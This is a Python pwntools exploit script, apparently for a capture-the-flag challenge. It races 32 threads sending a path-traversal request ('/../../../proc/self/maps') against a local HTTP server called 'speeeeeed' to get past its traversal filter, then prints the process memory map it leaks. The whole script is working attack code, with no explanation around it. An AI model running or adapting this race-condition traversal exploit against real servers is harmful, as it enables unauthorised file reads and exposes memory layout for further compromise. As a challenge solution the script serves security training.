#!/usr/bin/env python3

from pwn import *
import threading

context.log_level = 'error'
context.binary = elf = ELF('../src/build/speeeeeed')

HOST = "127.0.0.1"
PORT = 1337

# this is a race condition challenge, we must first bypass the path traversal filter using the race
def get_http_request(path: str|bytes) -> bytes:
    req = b"".join((
        b"GET ",
        path if isinstance(path, bytes) else path.encode(),
        b" HTTP/1.1\r\n",
        b"Host: race\r\n",
        b"Connection: close\r\n",
        b"\r\n",
    ))
    return req

def racer(path, stop_event):
    context.log_level = 'error'
    req = get_http_request(path)

    while not stop_event.is_set():
        try:
            io = remote(HOST, PORT)
            io.send(req)
            io.recvuntil(b'\r\n\r\n')
            io.close()
        except:
            break

stop_event = threading.Event()
threads = []
for _ in range(32):
    thread = threading.Thread(target=racer, args=("/../../../proc/self/maps", stop_event,), daemon=True)
    thread.start()
    threads.append(thread)

result = ""
for _ in range(10000):
    req = get_http_request("/foobar_path")
    io = remote(HOST, PORT)
    io.send(req)
    data = io.recvuntil(b'\r\n\r\n')
    if b'200' in data:
        result = io.recvall()
        stop_event.set()
        break

for thread in threads:
    thread.join(timeout=0.2)

print(result.decode())